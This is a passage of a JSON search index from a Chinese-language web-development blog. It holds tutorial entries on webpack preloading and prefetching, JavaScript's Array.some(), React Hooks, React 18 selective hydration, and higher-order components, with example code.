vs. \u0026lt;body\u0026gt; 中使用 \u0026lt;script defer\u0026gt; 来帮助及早发现这些资源。\n\r\r在单页应用程序中预加载 虽然预取是缓存可能很快会被请求的资源的好方法，但可以预加载需要立即使用的资源。 也许它是在初始渲染中使用的某种字体，或者用户立即看到的某些图像。\n假设我们的 EmojiPicker 组件应该在初始渲染时立即可见。 虽然它不应该包含在主包中，但它应该并行加载。 就像 prefetch 一样，可以添加一个神奇的注释，让 Webpack 知道应该预加载这个模块。\n1 2  const EmojiPicker = import(/* webpackPreload: true */ \u0026#34;./EmojiPicker\u0026#34;);   const path = require(\u0026#34;path\u0026#34;);\rconst HTMLWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;);\rconst PreloadWebpackPlugin = require(\u0026#34;preload-webpack-plugin\u0026#34;);\rmodule.exports = {\rentry: {\rmain: \u0026#34;./src/index.js\u0026#34;,\remojiPicker: \u0026#34;./src/components/EmojiPicker.js\u0026#34;\r},\rmodule: {\rrules: [\r{\rtest: /\\.(js|jsx)$/,\rexclude: /node_modules/,\ruse: [\u0026#34;babel-loader\u0026#34;]\r},\r{\rtest: /\\.css$/i,\ruse: [\u0026#34;style-loader\u0026#34;, \u0026#34;css-loader\u0026#34;]\r}\r]\r},\rresolve: {\rextensions: [\u0026#34;*\u0026#34;, \u0026#34;.js\u0026#34;, \u0026#34;.jsx\u0026#34;]\r},\rmode: \u0026#34;development\u0026#34;,\routput: {\rpath: path.resolve(__dirname, \u0026#34;dist\u0026#34;),\rfilename: \u0026#34;[name].bundle.js\u0026#34;\r},\rplugins: [\rnew HTMLWebpackPlugin({\rtemplate: path.resolve(__dirname, \u0026#34;dist\u0026#34;, \u0026#34;index.html\u0026#34;)\r}),\rnew PreloadWebpackPlugin({\rrel: \u0026#34;preload\u0026#34;,\ras: \u0026#34;script\u0026#34;,\rinclude: [\u0026#34;emojiPicker\u0026#34;]\r})\r],\rdevServer: {\rcontentBase: path.join(__dirname, \u0026#34;dist\u0026#34;),\rcompress: true,\rport: 9000\r}\r}; Webpack 4.6.0+ 允许通过在导入中添加 /* webpackPreload: true */ 来预加载资源。 为了在旧版本的 webpack 中进行预加载，需要将 preload-webpack-plugin 添加到您的 webpack 配置中。\n构建应用程序后，可以看到 EmojiPicker 将被预取。\nAsset Size Chunks Chunk Names\remoji-picker.bundle.js 1.49 KiB emoji-picker [emitted] emoji-picker\rvendors~emoji-picker.bundle.js 171 KiB vendors~emoji-picker [emitted] vendors~emoji-picker\rmain.bundle.js 1.34 MiB main [emitted] main\rEntrypoint main = main.bundle.js\r(preload: vendors~emoji-picker.bundle.js emoji-picker.bundle.js) 实际输出作为链接标签可见，在文档头部带有 rel=\u0026quot;preload\u0026quot;。\n\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt;\r\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;vendors~emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt; 预加载的 EmojiPicker 可以与初始包并行加载。 与预取不同的是，浏览器在是否认为它有足够好的互联网连接和带宽来实际预取资源方面仍然有发言权，预加载的资源无论如何都会被预加载。\n无需等待 EmojiPicker 在初始渲染后加载，资源将立即可供我们使用！ 由于我们正在以更智能的顺序加载资产，初始加载时间可能会显着增加，具体取决于您的用户设备和互联网连接。 仅在初始渲染后约 1 秒预加载必须可见的资源。\n\r预加载 + 异步 hack 如果希望浏览器以高优先级下载脚本，但不阻止解析器等待脚本，可以利用下面的 preload + async hack。 在这种情况下，预加载可能会延迟其他资源的下载，但这是开发人员必须做出的权衡：\n\u0026lt;link rel=\u0026#34;preload\u0026#34; href=\u0026#34;emoji-picker.js\u0026#34; as=\u0026#34;script\u0026#34;\u0026gt;\r\u0026lt;script src=\u0026#34;emoji-picker.js\u0026#34; async\u0026gt; 在 Chrome 95+ 中预加载 由于对 Chrome 95+ 中预加载队列跳转行为的一些修复，该功能在更广泛地使用时稍微安全一些。 Chrome 对预加载的新建议的 Pat Meenan 建议：\n  将它放在 HTTP 标头中将领先于其他所有内容\n通常，预加载将按照解析器对 \u0026gt;= 中的任何内容的顺序加载，因此请小心将预加载放在 HTML 的开头。\n  字体预加载可能最好在头部的末尾或正文的开头\n  导入预加载应该在需要导入的脚本标签之后完成（因此首先加载/解析实际脚本）\n  图像预加载将具有低优先级，应相对于异步脚本和其他低/最低优先级标签进行排序\n  \r结论 同样，请谨慎使用预加载并始终衡量其对生产的影响。\n如果图像的预加载在文档中比它更早，这可以帮助浏览器发现它（以及相对于其他资源的顺序）。\n如果使用不当，预加载会导致图像延迟首次内容绘制（例如 CSS、字体）—— 与您想要的相反。\n另请注意，要使此类重新确定优先级工作有效，还取决于服务器正确确定请求的优先级。\n您可能还会发现 \u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt; 在需要获取脚本而不执行它们的情况下很有帮助。\n\r知识点   webpack\n  \u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt;\n  ","description":"在发现关键资源之前通知浏览器","id":121,"section":"react-patterns","tags":null,"title":"预加载","uri":"https://codthing.github.io/react-patterns/performance-patterns/preload/"},{"content":"some() 方法测试数组中是否至少有一个元素通过了提供的函数实现的测试。 如果在数组中找到一个元素，提供的函数为其返回真值，则返回真值； 否则返回false。 它不会修改数组。\n\r使用 some 方法检查数组中是否有元素是否符合条件 some 方法用于检测数组中任何元素是否满足指定条件。\n如果有一个元素满足条件，返回布尔值 true，反之返回 false。\n举个例子，下面的代码检测数组numbers中是否有元素小于 10：\n1 2 3 4 5 6 7 8  const numbers = [10, 50, 8, 220, 110, 11]; numbers.some(function(currentValue) { return currentValue \u0026lt; 10; }); // true   在 checkPositive 函数值中使用 some 检查 arr 中是否有元素为正数。 函数应返回一个布尔值。\n1 2 3 4 5 6 7 8  function checkPositive(arr) { return arr.some(elem =\u0026gt; elem \u0026gt; 0); } checkPositive([1, 2, 3, -4, 5]); // true   ","description":"some() 方法测试数组中是否至少有一个元素通过了提供的函数实现的测试。 如果在数组中找到一个元素，提供的函数为其返回真值，则返回真值； 否则返回false。 它不会修改数组。","id":122,"section":"javascript","tags":null,"title":"Array.prototype.some()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/some-programming/"},{"content":"React 16.8 引入了一个名为 Hooks 的新功能。\nHooks 使得使用 React 状态和生命周期方法成为可能，而无需使用 ES2015 类组件。\n尽管 Hooks 不一定是一种设计模式，但 Hooks 在您的应用程序设计中扮演着非常重要的角色。\n许多传统的设计模式可以被 Hooks 取代。\n\rclass 组件（X） 在 React 中引入 Hooks 之前，我们必须使用类组件来向组件添加状态和生命周期方法。 React 中的典型类组件可能如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  class MyComponent extends React.Component { /* 添加状态和绑定自定义方法 */ constructor() { super() this.state = { ... } this.customMethodOne = this.customMethodOne.bind(this) this.customMethodTwo = this.customMethodTwo.bind(this) } /* 生命周期方法 */ componentDidMount() { ...} componentWillUnmount() { ... } /* 自定义方法 */ customMethodOne() { ... } customMethodTwo() { ... } render() { return { ... }} }   类组件可以在其构造函数中包含状态、生命周期方法\n（例如 componentDidMount 和 componentWillUnmount 以根据组件的生命周期执行副作用）以及自定义方法以向类添加额外逻辑。\nclass 组件的缺点 尽管引入 React Hooks 后我们仍然可以使用类组件，但使用类组件可能会有一些缺点！ 让我们看一下使用类组件时最常见的一些问题。\n了解 ES2015 类 由于在 React Hooks 之前，类组件是唯一可以处理状态和生命周期方法的组件，因此我们经常不得不将功能组件重构为类组件，以添加额外的功能。\n在此示例中，有一个用作按钮的简单 div。\nfunction Button() {\rreturn \u0026lt;div className=\u0026#34;btn\u0026#34;\u0026gt;disabled\u0026lt;/div\u0026gt;;\r} 我们希望在用户单击按钮时将其更改为启用，而不是始终显示禁用，并在发生这种情况时为按钮添加一些额外的 CSS 样式。\n为了做到这一点，我们需要向组件添加状态，以便知道状态是启用还是禁用。 这意味着我们必须完全重构功能组件，并使其成为跟踪按钮状态的类组件。\nexport default class Button extends React.Component {\rconstructor() {\rsuper();\rthis.state = { enabled: false };\r}\rrender() {\rconst { enabled } = this.state;\rconst btnText = enabled ? \u0026#34;enabled\u0026#34; : \u0026#34;disabled\u0026#34;;\rreturn (\r\u0026lt;div\rclassName={`btn enabled-${enabled}`}\ronClick={() =\u0026gt; this.setState({ enabled: !enabled })}\r\u0026gt;\r{btnText}\r\u0026lt;/div\u0026gt;\r);\r}\r} 最后，按钮按我们想要的方式工作！\n在这个例子中，组件非常小，重构并不是什么大事。 然而，现实生活中的组件可能包含更多的代码行，这使得重构组件变得更加困难。\n除了必须确保在重构组件时不会意外更改任何行为，\n您还需要了解 ES2015 类的工作原理。 为什么我们必须绑定自定义方法？ 构造函数是做什么的？ this 关键字从何而来？ 很难知道如何正确重构组件而不意外更改数据流。\n重构 在多个组件之间共享代码的常用方法是使用高阶组件或渲染道具模式。 尽管这两种模式都是有效的并且是一种很好的做法，但稍后添加这些模式需要您重新构建应用程序。\n除了必须重构您的应用程序（组件越大越棘手），为了在更深的嵌套组件之间共享代码而拥有许多包装组件可能会导致最好将其称为包装器地狱。 打开开发工具并看到类似于以下内容的结构并不少见：\n\u0026lt;WrapperOne\u0026gt;\r\u0026lt;WrapperTwo\u0026gt;\r\u0026lt;WrapperThree\u0026gt;\r\u0026lt;WrapperFour\u0026gt;\r\u0026lt;WrapperFive\u0026gt;\r\u0026lt;Component\u0026gt;\r\u0026lt;h1\u0026gt;Finally in the component!\u0026lt;/h1\u0026gt;\r\u0026lt;/Component\u0026gt;\r\u0026lt;/WrapperFive\u0026gt;\r\u0026lt;/WrapperFour\u0026gt;\r\u0026lt;/WrapperThree\u0026gt;\r\u0026lt;/WrapperTwo\u0026gt;\r\u0026lt;/WrapperOne\u0026gt; 包装器地狱会使您难以理解数据如何流经您的应用程序，从而更难弄清楚为什么会发生意外行为。\n复杂 随着我们向类组件添加更多逻辑，组件的大小会快速增加。 该组件内的逻辑可能会变得混乱和非结构化，这会使开发人员难以理解类组件中使用某些逻辑的位置。 这会使调试和优化性能变得更加困难。\n生命周期方法也需要大量的代码重复。 我们来看一个例子，它使用了一个 Counter 组件和一个 Width 组件。\nimport React from \u0026#34;react\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rimport { Count } from \u0026#34;./Count\u0026#34;;\rimport { Width } from \u0026#34;./Width\u0026#34;;\rexport default class Counter extends React.Component {\rconstructor() {\rsuper();\rthis.state = {\rcount: 0,\rwidth: 0\r};\r}\rcomponentDidMount() {\rthis.handleResize();\rwindow.addEventListener(\u0026#34;resize\u0026#34;, this.handleResize);\r}\rcomponentWillUnmount() {\rwindow.removeEventListener(\u0026#34;resize\u0026#34;, this.handleResize);\r}\rincrement = () =\u0026gt; {\rthis.setState(({ count }) =\u0026gt; ({ count: count + 1 }));\r};\rdecrement = () =\u0026gt; {\rthis.setState(({ count }) =\u0026gt; ({ count: count - 1 }));\r};\rhandleResize = () =\u0026gt; {\rthis.setState({ width: window.innerWidth });\r};\rrender() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Count\rcount={this.state.count}\rincrement={this.increment}\rdecrement={this.decrement}\r/\u0026gt;\r\u0026lt;div id=\u0026#34;divider\u0026#34; /\u0026gt;\r\u0026lt;Width width={this.state.width} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r} App 组件的结构方式可以如下所示：\n虽然这是一个很小的组件，但是组件内部的逻辑已经很混乱了。 某些部分特定于计数器逻辑，而其他部分特定于宽度逻辑。 随着组件的增长，在组件内构建逻辑、在组件内找到相关逻辑会变得越来越困难。\n除了混乱的逻辑，我们还在生命周期方法中复制了一些逻辑。 在 componentDidMount 和 componentWillUnmount 中，我们根据窗口的调整大小事件自定义应用程序的行为。\n\rHooks 很明显，类组件在 React 中并不总是一个很好的特性。 为了解决 React 开发者在使用类组件时可能遇到的常见问题，React 引入了 React Hooks。 React Hooks 是可用于管理组件状态和生命周期方法的函数。\nReact Hooks 可以：\n 向功能组件添加状态 管理组件的生命周期，而无需使用诸如 componentDidMount 和 componentWillUnmount 之类的生命周期方法 在整个应用程序的多个组件之间重用相同的有状态逻辑  首先，让我们看一下如何使用 React Hooks 向功能组件添加状态。\nstate React 提供了一个钩子来管理功能组件中的状态，称为 useState。\n让我们看看如何使用 useState 钩子将类组件重组为功能组件。 有一个名为 Input 的类组件，它只是渲染一个输入字段。 每当用户在输入字段中输入任何内容时，状态中输入的值就会更新。\nclass Input extends React.Component {\rconstructor() {\rsuper();\rthis.state = { input: \u0026#34;\u0026#34; };\rthis.handleInput = this.handleInput.bind(this);\r}\rhandleInput(e) {\rthis.setState({ input: e.target.value });\r}\rrender() {\r\u0026lt;input onChange={handleInput} value={this.state.input} /\u0026gt;;\r}\r} 为了使用 useState 钩子，我们需要访问 React 为我们提供的 useState 方法。 useState 方法需要一个参数：这是状态的初始值，在本例中为空字符串。\n我们可以从 useState 方法中解构两个值：\n 状态的当前值 更新状态的方法  const [value, setValue] = React.useState(initialValue); 第一个值可以与类组件的 this.state.[value] 进行比较。 第二个值可以与类组件的 this.setState 方法进行比较。\n由于我们正在处理输入的值，让我们调用状态输入的当前值，以及更新状态 setInput 的方法。 初始值应该是一个空字符串。\nconst [input, setInput] = React.useState(\u0026#34;\u0026#34;); 现在可以将 Input 类组件重构为有状态的功能组件。\nfunction Input() {\rconst [input, setInput] = React.useState(\u0026#34;\u0026#34;);\rconsole.log(input)\rreturn \u0026lt;input onChange={(e) =\u0026gt; setInput(e.target.value)} value={input} /\u0026gt;;\r} 输入字段的值等于输入状态的当前值，就像在类组件示例中一样。 当用户在输入字段中输入时，输入状态的值会使用 setInput 方法相应更新。\nEffect Hook 我们已经看到可以使用 useState 组件来处理功能组件内的状态，但是类组件的另一个好处是可以向组件添加生命周期方法。\n使用 useEffect 钩子，我们可以“钩入”组件生命周期。 useEffect 钩子有效地结合了 componentDidMount、componentDidUpdate 和 componentWillUnmount 生命周期方法。\ncomponentDidMount() { ... }\ruseEffect(() =\u0026gt; { ... }, [])\rcomponentWillUnmount() { ... }\ruseEffect(() =\u0026gt; { return () =\u0026gt; { ... } })\rcomponentDidUpdate() { ... }\ruseEffect(() =\u0026gt; { ... }) 让我们使用在 state 部分中使用的输入示例。 每当用户在输入字段中输入任何内容时，我们还希望将该值记录到控制台。\n我们需要使用“监听”输入值的 useEffect 钩子。 我们可以通过将输入添加到 useEffect 钩子的依赖项数组来实现。 依赖数组是 useEffect 钩子接收的第二个参数。\nimport React, { useState, useEffect } from \u0026#34;react\u0026#34;;\rexport default function Input() {\rconst [input, setInput] = useState(\u0026#34;\u0026#34;);\ruseEffect(() =\u0026gt; {\rconsole.log(`The user typed ${input}`);\r}, [input]);\rreturn (\r\u0026lt;input\ronChange={e =\u0026gt; setInput(e.target.value)}\rvalue={input}\rplaceholder=\u0026#34;Type something...\u0026#34;\r/\u0026gt;\r);\r} 每当用户键入值时，输入的值现在都会记录到控制台。\n自定义 Hooks 除了 React 提供的内置钩子\n（useState、useEffect、useReducer、useRef、useContext、useMemo、useImperativeHandle、useLayoutEffect、useDebugValue、useCallback），\n我们还可以轻松创建自己的自定义钩子。\n你可能已经注意到，所有的钩子都是从use开头的。 为了让 React 检查它是否违反了 Hooks 的规则，开头use钩子是很重要的。\nHooks 的另一个巨大优势是社区可以构建和共享 hooks。 我们有时候没必要自己编写钩子！ 自定义钩子已经由其他人构建，如果安装它，就可以在我们的应用程序中使用它！\n这里有一些网站列出了社区构建的所有钩子，并准备在您的应用程序中使用。\n React Use useHooks React Hooks 的集合  \r附加 Hooks 指南 添加 Hooks 与其他组件一样，当您想将 Hooks 添加到您编写的代码中时，会使用一些特殊的函数。 以下是一些常见 Hook 函数的简要概述：\n1. useState\nuseState Hook 使开发人员能够更新和操作函数组件内的状态，而无需将其转换为类组件。 这个 Hook 的一个优点是它很简单，不需要像其他 React Hook 那样复杂。\n2. useEffect\nuseEffect Hook 用于在函数组件中的主要生命周期事件期间运行代码。\n函数组件的主体不允许突变、订阅、计时器、日志记录和其他副作用。 如果允许，则可能会导致 UI 中出现令人困惑的错误和不一致。\nuseEffect 钩子可以防止所有这些“副作用”，并允许 UI 平稳运行。 它是 componentDidMount 、 componentDidUpdate 和 componentWillUnmount 的组合。\n3. useContext\nuseContext Hook 接受一个上下文对象，它是从 React.createcontext 返回的值，并返回该上下文的当前上下文值。 useContext Hook 还与 React Context API 一起使用，以便在整个应用程序中共享数据，而无需通过各个级别向下传递您的应用程序道具。\n应该注意的是，传递给 useContext 钩子的参数必须是上下文对象本身，并且任何调用 useContext 的组件总是在上下文值更改时重新渲染。\n4. useReducer\nuseReducer Hook 提供了 setState 的替代方案，当您有涉及多个子值的复杂状态逻辑或下一个状态依赖于前一个状态时，尤其适合使用它。\n它接受一个 reducer 函数和一个初始状态输入，并通过数组解构的方式返回当前状态和一个 dispatch 函数作为输出。\nuseReducer 还优化了触发深度更新的组件的性能。\n使用 Hooks 的优缺点 以下是使用 Hook 的一些好处：\n更少的代码行 Hooks 允许您按关注点和功能而不是按生命周期对代码进行分组。 这使得代码不仅更清晰简洁，而且更短。 下面是一个使用 React 的可搜索产品数据表的简单无状态组件的比较，以及使用 useState 关键字后它在 Hooks 中的外观。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  //class无状态组件 class TweetSearchResults extends React.Component { constructor(props) { super(props); this.state = { filterText: \u0026#39;\u0026#39;, inThisLocation: false }; this.handleFilterTextChange = this.handleFilterTextChange.bind(this); this.handleInThisLocationChange = this.handleInThisLocationChange.bind(this); } handleFilterTextChange(filterText) { this.setState({ filterText: filterText }); } handleInThisLocationChange(inThisLocation) { this.setState({ inThisLocation: inThisLocation }) } render() { return ( \u0026lt;div\u0026gt; \u0026lt;SearchBar filterText={this.state.filterText} inThisLocation={this.state.inThisLocation} onFilterTextChange={this.handleFilterTextChange} onInThisLocationChange={this.handleInThisLocationChange} /\u0026gt; \u0026lt;TweetList tweets={this.props.tweets} filterText={this.state.filterText} inThisLocation={this.state.inThisLocation} /\u0026gt; \u0026lt;/div\u0026gt; ); } }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  //使用 Hooks 相同的组件 const TweetSearchResults = ({tweets}) =\u0026gt; { const [filterText, setFilterText] = useState(\u0026#39;\u0026#39;); const [inThisLocation, setInThisLocation] = useState(false); return ( \u0026lt;div\u0026gt; \u0026lt;SearchBar filterText={filterText} inThisLocation={inThisLocation} setFilterText={setFilterText} setInThisLocation={setInThisLocation} /\u0026gt; \u0026lt;TweetList tweets={tweets} filterText={filterText} inThisLocation={inThisLocation} /\u0026gt; \u0026lt;/div\u0026gt; ); }   简化复杂的组件\nJavaScript 类可能难以管理，难以与热重载一起使用，并且可能无法缩小。\nReact Hooks 解决了这些问题并确保函数式编程变得简单。 通过 Hooks 的实现，我们不需要类组件。\n重用有状态逻辑\nJavaScript 中的类鼓励多层次的继承，这会迅速增加整体复杂性和出错的可能性。\n但是，Hooks 允许您在不编写类的情况下使用状态和其他 React 功能。 使用 React，您可以随时重用有状态逻辑，而无需一遍又一遍地重写代码。 这减少了出错的机会，并允许使用普通函数进行组合。\n共享非视觉逻辑\n在 Hooks 实现之前，React 无法提取和共享非可视化逻辑。 这最终导致了更多的复杂性，例如 HOC 模式和 render 道具，只是为了解决一个常见问题。\n但是，Hooks 的引入解决了这个问题，因为它允许将有状态的逻辑提取到一个简单的 JavaScript 函数中。\n当然，Hooks 有一些潜在的缺点值得牢记：\n 必须尊重它的规则，没有 linter 插件，很难知道哪个规则被破坏了。 需要相当长的时间练习才能正确使用（Exp：useEffect）。 注意错误的使用（Exp：useCallback，useMemo）。  Hooks vs 类 使用 React Hooks 可以更清晰地将我们组件的逻辑分成几个更小的部分。 重用相同的有状态逻辑变得更加容易，如果我们想让组件有状态，我们不再需要将功能组件重写为类组件。 不再需要对 ES2015 类有很好的了解，并且具有可重用的有状态逻辑增加了组件的可测试性、灵活性和可读性。\n当 Hooks 被引入 React 时，它产生了一个新问题：我们如何知道什么时候使用带有 Hooks 和类组件的函数组件？\n在 Hooks 的帮助下，即使在函数组件中也可以获取状态和部分生命周期 Hooks。\nHooks 还允许您在不编写类的情况下使用本地状态和其他 React 功能。\n以下是 Hooks 和 Classes 之间的一些差异，以帮助您做出决定：\n   React Hooks class     它有助于避免多个层次结构并使代码更清晰 一般来说，当你使用 HOC 或 renderProps 时，当你尝试在 DevTools 中看到它时，你必须用多个层次结构重构你的 App   它提供了 React 组件之间的一致性。 由于需要了解绑定和调用函数的上下文，类会混淆人类和机器。    \r知识点  useState useEffect useContext useReducer  ","description":"使用函数在整个应用程序的多个组件之间重用有状态逻辑","id":123,"section":"react-patterns","tags":null,"title":"Hooks 模式","uri":"https://codthing.github.io/react-patterns/design-patterns/hooks-pattern/"},{"content":"在之前的文章中，我们介绍了 SSR 和 Hydration 如何改善用户体验。\nReact 能够（快速）使用 react-dom/server 库提供的 renderToString 方法在服务器上生成一棵树，该方法在整个树生成后发送到客户端。\n渲染的 HTML 是非交互式的，直到 JavaScript 包被获取和加载，之后 React 沿着树向下走以获取和附加处理程序。\n但是，由于当前实现的一些限制，这种方法可能会导致一些性能问题。\n在服务器渲染的 HTML 树能够发送到客户端之前，所有组件都需要准备好。\n这意味着可能依赖外部 API 调用或任何可能导致某些延迟的进程的组件最终可能会阻止较小的组件快速呈现。\n除了较慢的树生成之外，另一个问题是 React 只对树进行一次水合。\n这意味着在 React 能够对任何组件进行水合之前，它需要先获取所有组件的 JavaScript，然后才能对任何组件进行水合。\n这意味着较小的组件（带有较小的包）必须等待较大组件的代码被获取和加载，直到 React 能够在您的网站上处理任何内容。在此期间，该网站保持非互动状态。\n\rReact 18 通过允许将流式服务器端渲染与一种新的水化方法相结合来解决这些问题：选择性水化！\n我们现在可以使用服务器上的新 pipeToNodeStream 方法流式渲染 HTML，而不是使用我们之前介绍的 renderToString 方法。\n此方法与 createRoot 方法和 Suspense 相结合，可以开始流式传输 HTML，而无需等待较大的组件准备就绪。\n这意味着可以在使用 SSR 时延迟加载组件，这在以前（真的）是不可能的！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  // index.js import { hydrateRoot } from \u0026#34;react-dom\u0026#34;; import App from \u0026#39;./App\u0026#39;; hydrateRoot(document, \u0026lt;App /\u0026gt;); // App.js import { Suspense, lazy } from \u0026#34;react\u0026#34;; import Loader from \u0026#34;./Loader\u0026#34;; const Comments = lazy(() =\u0026gt; import(\u0026#34;./Comments\u0026#34;)); function App() { return ( \u0026lt;main\u0026gt; \u0026lt;Header /\u0026gt; \u0026lt;Suspense fallback={\u0026lt;Loader /\u0026gt;}\u0026gt; \u0026lt;Comments /\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;Footer /\u0026gt; \u0026lt;/main\u0026gt; ) } // server.js import { pipeToNodeStream} from \u0026#34;react-dom/server\u0026#34;; export function render(res) { const data = createServerData(); const { startWriting, abort } = pipeToNodeWritable( \u0026lt;DataProvider data={data}\u0026gt; \u0026lt;App assets={assets} /\u0026gt; \u0026lt;/DataProvider\u0026gt;, res, { onReadyToStream() { res.setHeader(\u0026#39;Content-type\u0026#39;, \u0026#39;text/html\u0026#39;); res.write(\u0026#39;\u0026lt;!DOCTYPE html\u0026gt;\u0026#39;); startWriting(); } } ); };   之前减缓了树生成和 TTI 的 Comments 组件现在包含在 Suspense 中。\n这告诉 React 不要让这个组件减慢树生成的其余部分。\n相反，React 将回退组件作为最初呈现的 HTML 插入，并在发送到客户端之前继续生成树的其余部分。\n\r与此同时，我们仍在获取 Comments 组件所需的外部数据。\n选择性水合使得已经可以对发送到客户端的组件进行水合，甚至在发送 Comments 组件之前！\n\r一旦 Comments 组件的数据准备好，React 开始流式传输该组件的 HTML，以及一个小的 \u0026lt;script\u0026gt; 来替换回退加载器。\nReact 在注入新的 HTML 后开始水化。\n\rReact 18 修复了人们在将 SSR 与 React 一起使用时经常遇到的一些问题。\n流式渲染允许您在组件准备好后立即开始流式传输，而不会因为组件可能需要更长的时间在服务器上生成而导致 FCP 和 TTI 变慢。\n组件可以在流式传输到客户端后立即加水，因为我们不再需要等待所有 JavaScript 加载开始加水，并且可以在所有组件都加水之前开始与应用程序交互。\n\r\r知识点   pipeToNodeStream\n  Suspense\n  ","description":"如何将流服务器端渲染与新的水化方法结合使用，选择性水化","id":124,"section":"react-patterns","tags":null,"title":"选择性水合作用 ✔","uri":"https://codthing.github.io/react-patterns/render-patterns/react-selective-hydration/"},{"content":"Prefetch (\u0026lt;link rel=\u0026quot;prefetch\u0026quot;\u0026gt;) 是一种浏览器优化，它允许我们在需要之前获取后续路由或页面可能需要的资源。\n预取可以通过几种方式实现。\n它可以在 HTML 中声明性地完成（例如在下面的示例中），\n通过 HTTP 标头（链接：\u0026lt;/js/chat-widget.js\u0026gt;; rel=prefetch），\nService Workers 或通过更多自定义方式，例如通过 Webpack .\n\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;/pages/next-page.html\u0026#34;\u0026gt;\r\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;/js/emoji-picker.js\u0026#34;\u0026gt; \rPrefetch 预取 在展示如何根据可见性或交互导入模块的示例中，\n我们看到在单击按钮以切换组件与在屏幕上显示实际组件之间通常存在一些延迟。\n发生了这种情况，因为当用户单击按钮时，模块仍然需要被请求和加载！\n在许多情况下，我们知道用户会在页面初始呈现后不久请求某些资源。 尽管它们可能不会立即可见，因此不应包含在初始包中，但尽可能减少加载时间以提供更好的用户体验会很棒！\n可能在应用程序中的某个时刻使用的组件或资源可以被预取。 可以通过在 import 语句中添加一个神奇的注释来让 Webpack 知道某些包需要预取：/* webpackPrefetch: true */。\nconst EmojiPicker = import(/* webpackPrefetch: true */ \u0026#34;./EmojiPicker\u0026#34;); 构建应用程序后，可以看到 EmojiPicker 将被预取。\nAsset Size Chunks Chunk Names\remoji-picker.bundle.js 1.49 KiB emoji-picker [emitted] emoji-picker\rvendors~emoji-picker.bundle.js 171 KiB vendors~emoji-picker [emitted] vendors~emoji-picker\rmain.bundle.js 1.34 MiB main [emitted] main\rEntrypoint main = main.bundle.js\r(prefetch: vendors~emoji-picker.bundle.js emoji-picker.bundle.js) 实际输出作为链接标签可见，在文档头部带有 rel=\u0026quot;prefetch\u0026quot;。\n\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt;\r\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;vendors~emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt; 甚至在用户请求资源之前，浏览器就会请求和加载预取的模块。 当浏览器空闲并计算出它有足够的带宽时，它会发出请求以加载资源，并缓存它。 缓存资源可以显着减少加载时间，因为不必在用户单击按钮后等待请求完成。 它可以简单地从缓存中获取加载的资源。\n尽管预取是优化加载时间的好方法，但不要过度使用。\n如果用户最终从未请求过 EmojiPicker 组件，就不必要地加载了资源。 这可能会花费用户资金，或减慢应用程序的速度。 只预取必要的资源。\n您可能会发现以下有关预取的资源很有帮助：\n  Chrome 中的预加载、预取和优先级\n  通过预测性预取实现更快的导航\n  预取启发式\n  什么不能预取\n  \r知识点  webpack  ","description":"获取和缓存可能很快会被请求的资源","id":125,"section":"react-patterns","tags":null,"title":"预取","uri":"https://codthing.github.io/react-patterns/performance-patterns/prefetch/"},{"content":"这是历史遗留问题，所以不建议使用（现在有了Hooks），在这里只是让我们了解这段历史\n在我们的应用程序中，我们经常希望在多个组件中使用相同的逻辑。此逻辑可以包括将特定样式应用于组件、要求授权或添加全局状态。\n能够在多个组件中重用相同逻辑的一种方法是使用高阶组件模式。这种模式允许我们在整个应用程序中重用组件逻辑。\n高阶组件 (HOC) 是接收另一个组件的组件。HOC 包含我们想要应用于作为参数传递的组件的某些逻辑。应用该逻辑后，HOC 返回带有附加逻辑的元素。\n\r容器/展示 模式 假设我们一直想为应用程序中的多个组件添加某种样式。不是style每次都在本地创建一个对象，我们可以简单地创建一个 HOC，将style对象添加到我们传递给它的组件中\nfunction withStyles(Component) {\rreturn props =\u0026gt; {\rconst style = { padding: \u0026#39;0.2rem\u0026#39;, margin: \u0026#39;1rem\u0026#39; }\rreturn \u0026lt;Component style={style} {...props} /\u0026gt;\r}\r}\rconst Button = () = \u0026lt;button\u0026gt;Click me!\u0026lt;/button\u0026gt;\rconst Text = () =\u0026gt; \u0026lt;p\u0026gt;Hello World!\u0026lt;/p\u0026gt;\rconst StyledButton = withStyles(Button)\rconst StyedText = withStyles(Text) 我们刚刚创建了一个 StyledButton 和 StyledText 组件，它们是 Button 和 Text 组件的修改版本。它们现在都包含在 withStyles HOC 中添加的样式！\n让我们看一下之前在 Container/Presentational 模式中使用的同一个 DogImages 示例！该应用程序仅渲染从 API 获取的狗图像列表。\nHOC 模式 让我们稍微改善一下用户体验。 当我们获取数据时，我们希望向用户显示“正在加载\u0026hellip;”屏幕。 我们可以使用高阶组件为我们添加此逻辑，而不是直接向 DogImages 组件添加数据。\n让我们创建一个名为 withLoader 的 HOC。 HOC 应该接收一个组件，并返回该组件。 在这种情况下，withLoader HOC 应该接收应该显示 Loading\u0026hellip; 的元素，直到获取数据。\n让我们创建我们想要使用的 withLoader 